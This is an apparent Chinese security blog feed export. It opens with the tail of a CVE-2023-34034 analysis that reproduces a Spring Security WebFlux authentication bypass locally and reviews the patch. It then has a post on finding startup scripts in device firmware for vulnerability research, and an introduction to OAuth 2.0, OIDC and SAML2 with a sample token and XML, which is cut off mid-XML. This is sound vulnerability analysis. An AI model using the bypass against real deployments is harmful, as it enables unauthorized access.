<p>该测试模拟了一个HTTP请求”&#x2F;user&#x2F;test“，然后将其与路径模式”user&#x2F;**“进行比较，如果比较结果为<code>True</code>则测试通过。那么我们想想，这是不是说漏洞没有修复前这个比较结果为False，也就是说对于没有前导”&#x2F;“并使用了”**“的路径模式是不能匹配带前导”&#x2F;“的路径的？怀着这样的想法，我们修改我们的调试环境代码进行测试。</p>
<p>在控制器中设置一个不带前导”&#x2F;“的路径模式</p>
<p><img src="/archives/fe3c6472/image-20230822103307585.png" alt="image-20230822103307585"></p>
<p>同样在Spring Security中也设置一个同样不带前导”&#x2F;“的路径模式，两者保持一致，且访问该路径需要进行权限校验，并且其余所有的请求都不需要认证</p>
<p><img src="/archives/fe3c6472/image-20230822103337537.png" alt="image-20230822103337537"></p>
<p>此时将程序运行起来，然后访问<code>http://127.0.0.1:8080/hello-dev/test</code></p>
<p><img src="/archives/fe3c6472/image-20230822103649543.png" alt="image-20230822103649543"></p>
<p>发现WebFlux正确地匹配到了该路径，但Spring Security却并没有匹配到（若匹配到应提示进行未登录），这正好印证了漏洞描述中说的Spring Security与Spring WebFlux匹配规则不一致的问题。为了进一步确认，我们在Spring Security认证代码中增加前导”&#x2F;“</p>
<p><img src="/archives/fe3c6472/image-20230822103935948.png" alt="image-20230822103935948"></p>
<p>再次访问<code>http://127.0.0.1:8080/hello-dev/test</code></p>
<p><img src="/archives/fe3c6472/image-20230822104027172.png" alt="image-20230822104027172"></p>
<p>响应结果提示未登录了。至此，我们已经了解了该漏洞的表现形式以及利用方法。要完成该漏洞的利用需要程序员错误的Spring Security 路径模式设置，即未给路径添加前导”&#x2F;“，想来这种情况是比较少见的，所以该漏洞的影响其实是有限的。</p>
<p>知道了漏洞的表征，我们仍需要查看一下补丁以确认该漏洞是否真如我们猜想的这样，在<code>config/src/main/java/org/springframework/security/config/web/server/AbstractServerWebExchangeMatcherRegistry.java</code> 中新增了以下代码。</p>
<p><img src="/archives/fe3c6472/image-20230822104416434.png" alt="image-20230822104416434"></p>
<p>该修改主要修改了<code>pathMatchers(java.lang.String...)</code>方法的实现逻辑，在进行路径匹配前首先调用了<code>parsePatterns</code>方法对路径模式进行解析。<code>parsePatterns</code>方法先获取到一个默认的路径模式解析器<code>parser</code>，然后调用其<code>initFullPathPattern</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">initFullPathPattern</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> StringUtils.hasLength(pattern) &amp;&amp; !pattern.startsWith(<span class="string">&quot;/&quot;</span>) ? <span class="string">&quot;/&quot;</span> + pattern : pattern;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该方法判断传入的路径模式的长度若不为0，则判断其是否以”&#x2F;“开头，若不是则添加前导”&#x2F;“，即强制路径模式以”&#x2F;“开头，从而避免了该漏洞。</p>
<p>另一方面既然存在漏洞版本的Spring WebFlux能够正确解析无前导”&#x2F;“的情况，我们仍需看看其解析逻辑。Spring WebFlux在扫描Controller时会依次扫描各方法的注解，而这些注解的处理类在<code>org.springframework.web.reactive.result.method.annotation</code>包下面，而处理<code>RequestMapping</code>的处理器为<code>RequestMappingHandlerMapping</code>，在Bean装载时最终会调用到其<code>createRequestMappingInfo</code>方法。</p>
<p><img src="/archives/fe3c6472/image-20230822142906974.png" alt="image-20230822142906974"></p>
<p><img src="/archives/fe3c6472/image-20230822143112720.png" alt="image-20230822143112720"></p>
<p>该方法首先会解析element是否含有RequestMapping这个注解，element是一个Method对象。如果有再调用<code>createRequestMappingInfo</code>的重载方法。</p>
<p><img src="/archives/fe3c6472/image-20230822143204862.png" alt="image-20230822143204862"></p>
<p>在该方法中首先会创建一个builder，其封装了RequestMapping设置的请求方法、路径、参数、请求头等条件，然后调用build方法准备构建一个<code>RequestMappingInfo</code>对象。</p>
<p><img src="/archives/fe3c6472/image-20230822143515644.png" alt="image-20230822143515644"></p>
<p>注意到此时设置的路径匹配模式仍然没有发生变化，在调用parse方法后会发生什么？</p>
<p><img src="/archives/fe3c6472/image-20230822143646588.png" alt="image-20230822143646588"></p>
<p>parse方法会判断路径匹配模式是否一”&#x2F;“开头，若不是则补充。如此便能正常地进行路径匹配，这与存在漏洞的Spring Security版本处理逻辑不同，故两者的差异导致了漏洞产生。</p>
<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/spring-projects/spring-security/%EF%BC%9B">https://github.com/spring-projects/spring-security/；</a></li>
<li>规范编码，避免不规范的路径匹配模式。</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34034</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-34034">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-34034</a></li>
<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-34034</a></li>
<li><a href="https://spring.io/security/cve-2023-34034">https://spring.io/security/cve-2023-34034</a></li>
<li><a href="https://www.oschina.net/news/249933">https://www.oschina.net/news/249933</a></li>
<li><a href="https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780">https://github.com/spring-projects/spring-security/commit/7813a9ba26e53fe54e4d2ec6eb076126e8550780</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>认证绕过</tag>
        <tag>网络安全</tag>
        <tag>漏洞分析</tag>
        <tag>漏洞</tag>
        <tag>WebFlux Security</tag>
        <tag>CVE-2023-34034</tag>
      </tags>
  </entry>
  <entry>
    <title>如何快速在设备中查找程序启动脚本</title>
    <url>/archives/f0acb5c0.html</url>
    <content><![CDATA[<p>在拿到设备固件或者镜像文件后，若要进行更进一步的漏洞挖掘，我们便需要找到与当前设备功能相关联的软件的位置与启动方式等信息。<br>一般来讲如果只知道软件的位置便进行分析可能措施很多关键的信息，如：程序运行时设置的环境变量以及一些配置信息的设置。  </p>
<span id="more"></span>

<p>大多数情况下，程序在启动时并不是直接从elf文件启动，而是启动自shell脚本，同时为了能够让程序在每次重启系统或者开机时自动启动，<br>这些程序往往被注册成service可能被嵌入到一些其他在linux启动过程中会自动执行的脚本或者目录中。为了厘清在linux启动过程中究竟有哪些脚本被自动执行了，<br>我们首先需要对linux的启动过程有一个大概得了解。  </p>
<p>在用户按下电源按钮启动系统是，首先发挥总用的是bios系统，启主要完成的功能包括POST，即开机自检，主要完成对系统的硬件进行检查等工作；<br>在bios系统完成其使命后期会通过其内部设置去尝试访问不同的存储介质尝试拉起系统，<br>在Windos下进行PE启动时我们往往会进入到bios选择操作系统的引导位置为USB就是这一过程的体现，一般情况下，操作系统的引导位置都是硬盘；<br>在堆硬盘进行访问时，首先会读取硬盘的主引导分区中的信息，住引导分区中存储着的便是我们通常所说的bootloader（拉着自己鞋带向上提），<br>bootloader一般包括两部分，一部分由汇编编写，主要完成一些依赖CPU体系的初始化工作，并调用第二部分代码，第二部分由C语言来实现，<br>常见的bootloader包括grub grub2 uboot等，我们在启动linux时通常会见到一个让我们选择系统内核版本的界面，该界面就是bootloader在起作用；<br>在bootloader将操作系统内核加载到内存中后将开始运行操作系统的第一个程序，在最新版本的linux中通常是systemd程序而在较低版本中可能是init；<br>之后会选择系统的运行级别runlevel，在此过程中会加载运行一些etcrc.d目录下的脚本运行；再之后便会进入到用户登录选项了，<br>在用户输入正确的用户名密码登录后会加载etcprofile - etcprofile.d.sh -~.bash_profile - ~.bashrc - etcbashrc等文件初始化环境变量。  </p>
<p>在linux启动过程中凡是涉及到自动脚本执行的地方都有可能被修改插入设备程序启动脚本的地方，在查找时可以逐一排查。<br>不过，一般情况下更普遍的做法是将程序的启动过程注册为service。linux系统中的service可以通过命令systemctl 查看，<br>找到我们感兴趣的服务然后执行systemctl show service_name便可以查看与该服务相关的信息，我们可以从中找到服务的存储位置，<br>如：etcsystemdsystemdefault.target.wants.service  usrlibsystemdsystem.service  查看对应的service文件我们便可以找到相关的启动脚本所在位置，<br>然后通过阅读启动脚本了解程序启动过程中设置的环境变量、配置、启动参数等信息。  </p>
<p>除了这种追本溯源的方式，还有一种更加简单直接的方式，我们可以通过查进程的方式找到相关得信息。比如我们要找一个java程序，<br>可以直接执行ps -ef  grep java  便可以找到相关的程序的启动命令。如果只知道启动的端口，我们可以先执行netstat -tulnp查看到对应的PID信息，<br>然后通过PID使用命令ps命令也可以。  </p>
]]></content>
      <categories>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>漏挖技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>SSO解决方案简介</title>
    <url>/archives/ad6b67bf.html</url>
    <content><![CDATA[<h1 id="什么是SSO，为什么需要SSO"><a href="#什么是SSO，为什么需要SSO" class="headerlink" title="什么是SSO，为什么需要SSO"></a>什么是SSO，为什么需要SSO</h1><p>如果单从字面意思来理解，SSO表达了一种什么样的含义？我们知道，SSO的中文翻译为单点登录，顾名思义，即为单点，则表示在一个地方登录，登录的结果便是可以在多个地方被使用。在生活中常见的B&#x2F;S场景下，我们有时需要通过用户名密码来声明我们对某个网站的某些资源具有访问权限，如果存在多个这样的网站，出于安全考虑我们可能就需要每一个网站均通过不同的用户名密码来声明对这些资源的访问权限，这就导致我们需要记录大量的密码以及反复完成登录操作，这个过程是繁琐且容易出错的。SSO的出现便能在一定程度上对这个缺陷进行弥补。</p>
<p>当然，如果仅仅是出于便利性的需要，SSO技术可能仍不是那么紧要。SSO技术使得对于某一类网站，如：同一公司旗下的一组网站，用户只需在某一个统一的入口完成一次登录操作便可同时访问这一组网站所有的受限资源，并能够完成权限控制、统一的会话管理、统一的资源分配等其他操作，这使得受限资源的保密性、完整性以及可用性有不同程度的提高。</p>
<p>SSO技术不仅仅是对用户认证产生了正向的影响，其解决的另一个问题是为不受信第三方获取资源提供了一整套的解决方案，即第三方获取资源的授权问题。</p>
<p>我们例举一个具体的SSO技术方案来进行说明，这里引用OAuth2.0 规范中关于为什么需要OAuth的说明。</p>
<p>传统的受限资源访问方案往往是通过使用资源所有者的访问凭据来获取资源的访问权限，这种通过明文凭据的访问方案往往用于声明用户对某个资源的所有权，而不能很好地向第三方进行资源分配。传统地方案在应用于第三方应用对受限资源的方式时往往会面临以下四个方面的问题：</p>
<ul>
<li>第三方应用需要存储资源所有者的访问凭据，典型的方案就是用户名密码，这种方案显然是危险的，资源所有者不完全可以确认第三方应用地可信性；</li>
<li>受限资源通过密码访问，但密码体系本身存在各种各样的安全问题，如：泄露、强度问题等；</li>
<li>第三方应用通过密码获取到的访问权限太过广泛，资源所有者并没有很好的办法对这个范围进行限制，这往往需要配合其他的权限控制方案进行实现，如：RBAC，ABAC等；</li>
<li>资源所有者不能很好地对第三方应用对受限资源得访问进行控制，如：撤销权限，变更权限等操作，要做到这些往往需要通过修改密码以及变更角色权限的方式来实现。</li>
</ul>
<p>正因为传统的密码体系对受限资源的访问控制在应用到第三方应用的过程中存在的这些缺陷使然，亟需一种灵活、便捷、有效、安全的第三方应用访问受限资源的解决方案。如OAuth，CAS，OIDC，SAML等协议框架正是为了解决这些问题而诞生。</p>
<p>整体来讲，这些框架的基本原理是一致的，区别在于它们如何看待认证与授权过程中涉及到的各种对象以及如何描述他们之间的关系再辅以不同的数据传输与处理方案，比如：OIDC便基本上就是是基于OAuth 2.0基础上实现的一个框架，SAML与OAuth 2.0的隐式模式在表现上最大的差别也就在数据结构上面，CAS与OAuth 2.0的隐式模式也很相似，至少展露给用户的部分是极其相似的，区别在于CAS能够处理用户认证与授权，OAuth 2.0只负责处理授权且在CAS中第三方应用携带ticket去请求资源时会根据用户进行权限校验，而OAuth 2.0的权限授予在申请Access Token时便已经完成了。</p>
<p>下面我们将以OAuth 2.0授权框架为主体对常见的SSO解决方案进行一个认识。</p>
<span id="more"></span>



<h1 id="常见SSO协议"><a href="#常见SSO协议" class="headerlink" title="常见SSO协议"></a>常见SSO协议</h1><h2 id="OAuth-2-0"><a href="#OAuth-2-0" class="headerlink" title="OAuth 2.0"></a>OAuth 2.0</h2><p>Oauth 2.0授权框架允许第三方的应用程序通过与资源所有者进行交互或者以自身的名义来以HTTP的方式来获取受限资源的部分访问权限。该框架是在OAuth 1.0的基础上发展起来的，其是OAuth 1.0的替换以及发展，而在框架详细规范上OAuth 2.0与OAuth 1.0则大相径庭，两者不能互相兼容。OAuth 2.0是一个授权协议，与用户认证相关的部分并不在该框架的讨论范围类，但一般来说认证与授权是不分家的，认证是授权的基石，即便是OAuth 2.0框架也是在Clients获得了资源所有者身份认证之后才能进行进一步的授权，这正是OAuth 2.0所讨论的。</p>
<p>在OAuth2.0框架中组合要涉及到4个主体，即：资源所有者、资源服务提供者、客户端以及授权服务。其中资源所有者享有对资源服务提供者提供的资源的完全控制权力，资源服务提供者负责提供受保护的资源并响应通过Access Token发起的受保护资源请求，客户端是资源所有者的代理其并不表示任一具体的实现（应用程序）乃是一种抽象的概念，授权服务负责向经过认证的客户端下发Access Token。</p>
<h3 id="授权方案"><a href="#授权方案" class="headerlink" title="授权方案"></a>授权方案</h3><p>一个通用的OAuth 2.0协议处理流程是这样的：</p>
<p><img src="/archives/ad6b67bf/image-20240103112709252.png" alt="image-20240103112709252"></p>
<p>关于上图做如下解释：</p>
<p>（A）客户端向资源所有者请求授权。主要通过两者方式，一种是客户端（第三方应用）直接向资源所有者请求凭据，另一种则是通过授权服务作为中介请求凭据。直接请求凭据的方式客户端会存储资源所有者的明文凭据，存在安全性风险，一般只在客户端类型为Confidential 以及许可类型为客户端时使用，实践中常见的均为通过授权服务作为中介的方式请求凭据；</p>
<p>（B）客户端接收授权许可，这个许可表示了资源所有者的授权。在规范中共规定了4种标准的许可类型以及其他可自行定义的许可方式；</p>
<p>（C）客户端使用获得的授权许可向授权服务获取Access Token；</p>
<p>（D）授权服务在对客户端进行认证并校验了授权许可的正确性后下发Access Token；</p>
<p>（E）客户端通过上一步获得的Access Token向资源服务提供者请求资源；</p>
<p>（F）资源服务提供者在向授权服务验证Access Token的正确性后向客户端下发资源；</p>
<p>上文中提到OAuth 2.0规范中提供了4中标准的许可类型，下面进行介绍：</p>
<h4 id="授权码类型"><a href="#授权码类型" class="headerlink" title="授权码类型"></a>授权码类型</h4><p>授权码类型的许可按照如下图的流程进行资源的授权访问：</p>
<p><img src="/archives/ad6b67bf/image-20240103144212336.png" alt="image-20240103144212336"></p>
<p>（A）客户端通过资源所有者的代理（即用户浏览器）进行重定向将请求发送到授权服务端点。客户端请求包括client_id（标识客户端身份）、请求域（要申请哪些权限）、本地状态（随机数，防CSRF）以及一个将成功授权后的请求重定向的目标URI；</p>
<p>（B）授权服务对资源持有者的身份进行认证并确定资源持有者是否同意下发客户端请求的域；</p>
<p>（C）在授权成功的情况下，授权服务会将请求重定向到A过程中指定的重定向目标URI中，该URI将携带额外的授权码以及一些其他的状态参数；</p>
<p>（D）客户端请求携带client_id、client_secret以及授权码等向授权服务申请一个Access Token；</p>
<p>（E）授权服务在确认了客户端的合法性并校验了授权码后向向客户端下发Access Token 以及一个可选的Refresh Token。</p>
<h4 id="紧凑-隐式许可类型"><a href="#紧凑-隐式许可类型" class="headerlink" title="紧凑&#x2F;隐式许可类型"></a>紧凑&#x2F;隐式许可类型</h4><p>紧凑&#x2F;隐式许可类型的许可按照如下图的流程进行资源的授权访问：</p>
<p><img src="/archives/ad6b67bf/image-20240103154140345.png" alt="image-20240103154140345"></p>
<p>（A）（B）同授权码类型（A）(B)</p>
<p>（C）授权通过的情况下，授权服务将Access Token 夹带在redirection URI fragment中进行返回</p>
<p>（D）用户代理向Web托管的客户端资源发起请求</p>
<p>（E）获取到一个带有嵌入时脚本的html页面，该脚本能够提取在C中得到的Access Token并与完整的重定向URI进行组合</p>
<p>（F）用户代理利用E中返回的脚本将Access Token与重定向URI进行组合</p>
<p>（G）用户代理将Access Token传递给客户端</p>
<h4 id="资源所有者密码凭据类型"><a href="#资源所有者密码凭据类型" class="headerlink" title="资源所有者密码凭据类型"></a>资源所有者密码凭据类型</h4><p>资源所有者密码凭据类型的许可按照如下图的流程进行资源的授权访问：</p>
<p><img src="/archives/ad6b67bf/image-20240103155801548.png" alt="image-20240103155801548"></p>
<p>（A）资源持有者直接向客户端提供其密码凭据</p>
<p>（B）客户端通过获取到的密码凭据向授权服务请求Access Token</p>
<p>（C）授权服务在验证了客户端合法性与凭据合法性后向客户端下发Access Token以及可选的Refresh Token</p>
<h4 id="客户端凭据许可类型"><a href="#客户端凭据许可类型" class="headerlink" title="客户端凭据许可类型"></a>客户端凭据许可类型</h4><p>客户端凭据许可类型的许可按照如下图的流程进行资源的授权访问：</p>
<p><img src="/archives/ad6b67bf/image-20240103161547699.png" alt="image-20240103161547699"></p>
<p>（A）客户端向授权服务发送自身的凭据</p>
<p>（B）授权服务验证客户端凭据的有效性并下发Access Token</p>
<h2 id="OIDC"><a href="#OIDC" class="headerlink" title="OIDC"></a>OIDC</h2><p>OAuth 2.0只负责对资源的授权并不负责用户的认证，所以单纯地使用OAuth 2.0授权框架是不能完成用户认证的，而认证又是授权的基石，故在生产中我们往往不会见到单独使用的OAuth 2.0，其总是与其他的认证方案一起出现的。一种良好的既能兼顾认证又能兼顾授权的解决方案且基于OAuth 2.0的新的认证与授权解决方案便是OIDC。</p>
<p>OIDC与OAuth 2.0最大的区别就在于OIDC新增了ID Token作为用户的身份凭据。当然OIDC也在OAuth 2.0的基础上进行了一些丰富，如：服务发现等。</p>
<p>在OIDC中认证与授权过程中的角色有了新的名字：</p>
<ul>
<li>授权服务器（OP-OpenID Provider）</li>
<li>终端用户（EU-End User）</li>
<li>受信客户端（RP-Relying Party）</li>
</ul>
<p>OIDC中貌似忽略了OAuth 2.0的资源提供者这一角色，其实不然，只是被包含在了RP中。</p>
<p>OIDC的授权流程与OAuth 2.0基本一致，区别在于获取Access Token是，OIDC运行在授权码模式、隐式模式以及密码模式时会同时获取到ID Token以标识用户身份</p>
<p>下面是开源身份认证与授权应用KeyCloak的一个ID TOKEN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIzYjk0Y2YzMS03ZDYwLTQyYjUtYjA4YS1iZDVlYmYwYTA3ODQifQ.eyJleHAiOjE3MDUwNjM4MzMsImlhdCI6MTcwNTAyNzgzMywianRpIjoiYzYzZGYxNjItMTI2Mi00Nzk3LTkyOGMtNTkyMWFkOGFmMDk4IiwiaXNzIjoiaHR0cDovLzEyNy4wLjAuMTo4MDgwL3JlYWxtcy9tYXN0ZXIiLCJzdWIiOiJiYmUzMWE4NS1iNDk2LTQ3MWYtYTlkOS1hYjc5NjE4YjJhZjIiLCJ0eXAiOiJTZXJpYWxpemVkLUlEIiwic2Vzc2lvbl9zdGF0ZSI6IjNjYmNlOTAxLTZiODUtNDA4Ni04MWM4LThhZmUyZmQyM2FmNSIsInNpZCI6IjNjYmNlOTAxLTZiODUtNDA4Ni04MWM4LThhZmUyZmQyM2FmNSIsInN0YXRlX2NoZWNrZXIiOiIyYklaREE0OWV4d3RCRlFrNXg5SEZIWVBIaFpCZXNRcFNPOGo4UXNOMXBJIn0.GlF7wITRQqUonrtgOw26ewNFVGF8HdBUU1dd_MNmlQs</span><br></pre></td></tr></table></figure>

<p>解码后为</p>
<p><img src="/archives/ad6b67bf/image-20240112105835688.png" alt="image-20240112105835688"></p>
<p>在Payload部分定义了一些与用户身份相关的字段，如：sub，该字段标识了终端用户的ID。第三方应用在获取到该ID Token便可以使用该Token向<code>/userinfo</code>端点获取用户身份信息。</p>
<p>OIDC规范中定义了一些标准的用户信息，这些用户信息可以直接包含在<code>ID Token</code>中也可通过<code>userinfo</code>端点返回，参考：<a href="https://openid.net/specs/openid-connect-core-1_0.html#/StandardClaims">Standard Claims</a></p>
<p><img src="/archives/ad6b67bf/image-20240112105450001.png" alt="image-20240112105450001"></p>
<h2 id="SAML2"><a href="#SAML2" class="headerlink" title="SAML2"></a>SAML2</h2><p>SAML的全称为安全断言标记语言（Security Assertion Markup Language是一种开放标准，其允许身份提供商（IDP）将授权凭证传递给服务提供商（SP），使用可扩展标记语言（XML）进行IDP和SP之间的标准化通信。所谓IDP，顾名思义即提供身份认证的服务商，等同于OAuth 2.0中的授权服务（authorization server）以及OIDC中的（OP-OpenID Provider）；SP等同于OAuth 2.0中的资源服务（resource server）以及OIDC中的受信客户端（RP-Relying Party）。SP与IDP通过浏览器使用XML格式数据进行信息交互从而完成认证与授权操作，这个XML格式的数据就是断言。</p>
<p>SAML由一些构建块组成，当这些组件通过不同的方式组合在一起的时候就可以在不同场景下完成已经互相信任的自治系统之间对用户身份、属性、认证、授权信息的交换的需求，SAML规范的核心便是描述传输这些信息的断言和协议消息的结构与内容。</p>
<p>要完成这些目标，SAML体系定义了一些基本概念，如：Assertion，Protocols，Bindings，Profiles，Metadata，Authentication Context，Subject Confirmation。</p>
<p><img src="/archives/ad6b67bf/sstc-saml-tech-overview-2.0-cd-02_html_73dc0b55.gif" alt="SAML concepts"></p>
<ul>
<li><strong>SAML断言</strong>携带关于主体的声明，声明方声称该声明为真，依赖方解析该断言验证其完整性与有效性。断言的有效结构和内容由SAML断言的XML schema定义；</li>
<li><strong>协议</strong> 用于申明当前断言的类型，并绑定了不同的XML结构，该结构由XML schema限制，如：认证请求协议，单点登出协议，断言查询请求协议，Artifact 解析协议，身份标识管理协议，身份标识映射协议等；</li>
<li><strong>绑定</strong> 定义了SP与IDP是如何通过一些基础的协议（HTTP&#x2F;SOAP等）进行交互的，如：HTTP 重定向绑定，HTTP POST绑定，HTTP Artifact绑定，SAML SOAP绑定，SAML URI绑定等；</li>
<li><strong>SAML概要文件</strong>以满足特定的业务用例，例如Web Browser SSO配置文件。概要文件通常在SAML断言、协议和绑定的内容上定义约束，其定义了三者如何相互协作以便可以互操作的方式解决业务用例，包括Web Browser SSO Profile，identity Provider Discovery Profile，Single Logout Profile等</li>
<li><strong>元数据</strong>是SAML个构建块之间一些共有的配置数据，如：密钥，身份属性、实体支持的绑定方式等</li>
<li><strong>认证上下文</strong> 某些情境下SP可能会需要用户在IDP进行认证时所用的认证方式以及强度等环境信息，这些信息便是SP的认证上下文。SP可以从断言消息的authentication statement节点中获取这些信息。当然，IDP可能也需要一些类似的环境信息，其也可以从SAML的Request中获取到它们。</li>
<li><strong>主体确认</strong> 帮助依赖方确认断言响应的主体与依赖方正在请求的主体是一致的。SAML2中定义了三种模式<ul>
<li>urn:oasis:names:tc:SAML:2.0:cm:holder-of-key  # 通过密钥标识 依赖方需要声明与密钥的关系</li>
<li>urn:oasis:names:tc:SAML:2.0:cm:sender-vouches  # 由发送方指定断言由谁处理</li>
<li>urn:oasis:names:tc:SAML:2.0:cm:bearer  # 依赖方需要采取一些策略来判断是否具有对该断言的处理权限</li>
</ul>
</li>
</ul>
<p>SAML有多种应用场景，其中比较典型的两种分别时Web Browser SSO 以及Identity Federation。下面我们使用一个通过SAML来进行Web Browser SSO登录的例子来说明一些数据结构以及通过SAML来进行Web Browser SSO登录的流程，根据入口不同SAMl又有两种不同的消息流转方式，分别为SP-Initiated以及IDP-Initiated（qax的零信任，cy的404通行证），其中又以SP-Initiated在使用中最为常见。我们将以SP-Initiated的方式进行说明。</p>
<p>当用户访问某一个应用（SP）时，因为尚未取得认证与授权，此时SP会将请求重定向到IDP并携带SAML Request信息来请求IDP对用户身份进行认证。</p>
<p>SAML Request信息是一段被Base64编码的XML数据，解码后类似如下的格式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">samlp:AuthnRequest</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:samlp</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:saml</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">ID</span>=<span class="string">&quot;identifier_1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">Version</span>=<span class="string">&quot;2.0&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">IssueInstant</span>=<span class="string">&quot;2004-12-05T09:21:59Z&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">AssertionConsumerServiceIndex</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">saml:Issuer</span>&gt;</span>https://sp.example.com/SAML2<span class="tag">&lt;/<span class="name">saml:Issuer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">samlp:NameIDPolicy</span></span></span><br><span class="line"><span class="tag"><span class="attr">AllowCreate</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">Format</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">samlp:AuthnRequest</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当IDP接受到该请求后会响应给用户一个登录页面让用户输入身份凭据以验证用户身份，用户身份验证完成后IDP将响应给浏览器一个带自提交js脚本的页面将用户身份断言发送给SP，该断言经过解码后类似如下结构：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">samlp:Response</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:samlp</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:saml</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">IssueInstant</span>=<span class="string">&quot;xxxxx&quot;</span> <span class="attr">Destination</span>=<span class="string">&quot;https://xxx.idp.com/saml/SSO&quot;</span> <span class="attr">InResponseTo</span>=<span class="string">&quot;xxxxx&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">saml:Issuer</span>&gt;</span>https://xxx.idp.cn<span class="tag">&lt;/<span class="name">saml:Issuer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">samlp:Status</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">samlp:StatusCode</span> <span class="attr">Value</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">samlp:Status</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">saml:Assertion</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:saml</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> <span class="attr">ID</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">IssueInstant</span>=<span class="string">&quot;xxxxx&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:Issuer</span>&gt;</span>https://xxx.idp.cn<span class="tag">&lt;/<span class="name">saml:Issuer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ds:Signature</span></span></span><br><span class="line"><span class="tag">			<span class="attr">xmlns:ds</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ds:SignedInfo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:CanonicalizationMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:SignatureMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:Reference</span> <span class="attr">URI</span>=<span class="string">&quot;#xxxxxx&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:Transforms</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">ds:Transform</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;</span>/&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">ds:Transform</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">ds:Transforms</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span 